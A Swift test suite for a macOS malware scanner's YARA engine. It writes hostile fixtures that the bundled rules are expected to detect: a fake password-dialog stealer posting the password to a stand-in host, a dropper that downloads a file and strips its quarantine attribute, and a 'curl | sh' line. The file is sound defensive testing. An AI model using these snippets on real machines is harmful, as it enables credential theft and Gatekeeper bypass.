import Foundation
import Testing
@testable import MacScanCore

@Suite struct YaraEngineTests {
    static let yara = ToolLocator.autodetect(.yara)
    static let yarac = ToolLocator.autodetect(.yarac)

    func engine(rules: URL?, useCompiler: Bool = true, chunk: Int = 400) -> YaraEngine {
        YaraEngine(
            yaraURL: Self.yara.map { URL(fileURLWithPath: $0) },
            yaracURL: useCompiler ? Self.yarac.map { URL(fileURLWithPath: $0) } : nil,
            rulesFolder: rules,
            chunkSize: chunk
        )
    }

    @Test(.enabled(if: yara != nil, "yara not installed"), arguments: [true, false])
    func customRuleMatches(useCompiler: Bool) async throws {
        let dir = try TempDir()
        try dir.write("rules/test.yar", """
        rule Test_Marker {
            meta:
                description = "contains the test marker"
                severity = "threat"
            strings:
                $a = "MACSCAN-TEST-MARKER"
            condition:
                $a
        }
        """)
        let hit = try dir.write("files/hit.txt", "prefix MACSCAN-TEST-MARKER suffix")
        let miss = try dir.write("files/miss.txt", "nothing here")
        let weird = try dir.write("files/name with [brackets] and \"quotes\".txt", "MACSCAN-TEST-MARKER")

        let e = engine(rules: dir.url.appendingPathComponent("rules"), useCompiler: useCompiler, chunk: 2)
        #expect(await e.availability().isAvailable)

        let items = [hit, miss, weird].map { ScanItem(url: $0, kind: .file) }
        let recorder = EventRecorder()
        try await e.scan(items, context: .test, events: recorder.sink)
        let findings = await recorder.findings
        #expect(Set(findings.map(\.path)) == [hit.path, weird.path])
        #expect(findings.allSatisfy { $0.severity == .threat && $0.engine == .yara })
        #expect(findings.first?.reason == "YARA Test_Marker: contains the test marker")
        #expect(Set(await recorder.finished) == Set(items.map(\.path)))
    }

    @Test(.enabled(if: yara != nil && yarac != nil, "yara not installed"))
    func bundledSampleRulesCompileAndDetect() async throws {
        let rules = try #require(YaraEngine.bundledRulesFolder)
        let e = engine(rules: rules)
        #expect(e.ruleFiles().count >= 1)

        let dir = try TempDir()
        let stealer = try dir.write("evil.sh", """
        #!/bin/bash
        pw=$(osascript -e 'display dialog "macOS needs your password to continue" default answer "" with hidden answer' -e 'text returned of result')
        dscl . authonly "$USER" "$pw" && curl -s -X POST -d "p=$pw" https://example.invalid/collect
        """)
        let dropper = try dir.write("dropper.sh", """
        #!/bin/sh
        curl -s -o /tmp/.agent https://example.invalid/a
        xattr -d com.apple.quarantine /tmp/.agent
        chmod +x /tmp/.agent
        """)
        let eicar = try dir.write("eicar.com", EICAR.string)
        let readme = try dir.write("README.md", "Run: curl -s https://example.invalid | sh, then chmod +x and xattr -c the app. osascript display dialog hidden answer password")

        let items = [stealer, dropper, eicar, readme].map { ScanItem(url: $0, kind: .file) }
        let recorder = EventRecorder()
        try await e.scan(items, context: .test, events: recorder.sink)
        let byPath = Dictionary(grouping: await recorder.findings, by: \.path)

        #expect(byPath[stealer.path]?.contains { $0.reason.contains("MacOS_Script_Fake_Password_Prompt") && $0.severity == .threat } == true)
        #expect(byPath[dropper.path]?.contains { $0.reason.contains("MacOS_Script_Gatekeeper_Bypass_Download") } == true)
        #expect(byPath[eicar.path]?.contains { $0.reason.contains("MacScan_EICAR_Test_File") } == true)
        #expect(byPath[readme.path] == nil, "documentation without a shebang must not match")
    }

    @Test(.enabled(if: yara != nil && yarac != nil, "yara not installed"))
    func sampleRulesDoNotMatchThemselves() async throws {
        let rules = try #require(YaraEngine.bundledRulesFolder)
        let e = engine(rules: rules)
        let items = e.ruleFiles().map { ScanItem(url: $0, kind: .file) }
        let recorder = EventRecorder()
        try await e.scan(items, context: .test, events: recorder.sink)
        #expect(await recorder.findings.isEmpty)
    }

    @Test(.enabled(if: yara != nil && yarac != nil, "yara not installed"))
    func brokenRulesReportCompileError() async throws {
        let dir = try TempDir()
        try dir.write("rules/bad.yar", "rule Broken { condition: $undefined }")
        let f = try dir.write("f.txt", "x")
        let e = engine(rules: dir.url.appendingPathComponent("rules"))
        await #expect(throws: EngineError.self) {
            try await e.scan([ScanItem(url: f, kind: .file)], context: .test, events: { _ in })
        }
    }

    @Test func missingYaraAndEmptyFolder() async throws {
        let none = YaraEngine(yaraURL: nil, yaracURL: nil, rulesFolder: nil)
        guard case .notInstalled(let text) = await none.availability() else {
            Issue.record("expected notInstalled"); return
        }
        #expect(text.contains("brew install yara"))

        let dir = try TempDir()
        let empty = YaraEngine(yaraURL: URL(fileURLWithPath: "/bin/echo"), yaracURL: nil, rulesFolder: dir.url)
        guard case .needsSetup = await empty.availability() else {
            Issue.record("expected needsSetup"); return
        }
    }

    @Test func parsesMatchLines() {
        let m = YaraEngine.parseMatch(#"Rule_A [description="has, comma and ] bracket",severity="threat",score=5] /tmp/a b.txt"#)
        #expect(m?.rule == "Rule_A")
        #expect(m?.meta["description"] == "has, comma and ] bracket")
        #expect(m?.meta["severity"] == "threat")
        #expect(m?.meta["score"] == "5")
        #expect(m?.path == "/tmp/a b.txt")

        #expect(YaraEngine.parseMatch("Plain /x/y")?.path == "/x/y")
        #expect(YaraEngine.parseMatch("Rule [] /z")?.path == "/z")
        #expect(YaraEngine.parseMatch("error scanning /x: could not open file") == nil)
        #expect(YaraEngine.parseMatch(#"R [d="esc \"q\""] /p"#)?.meta["d"] == #"esc "q""#)
    }
}
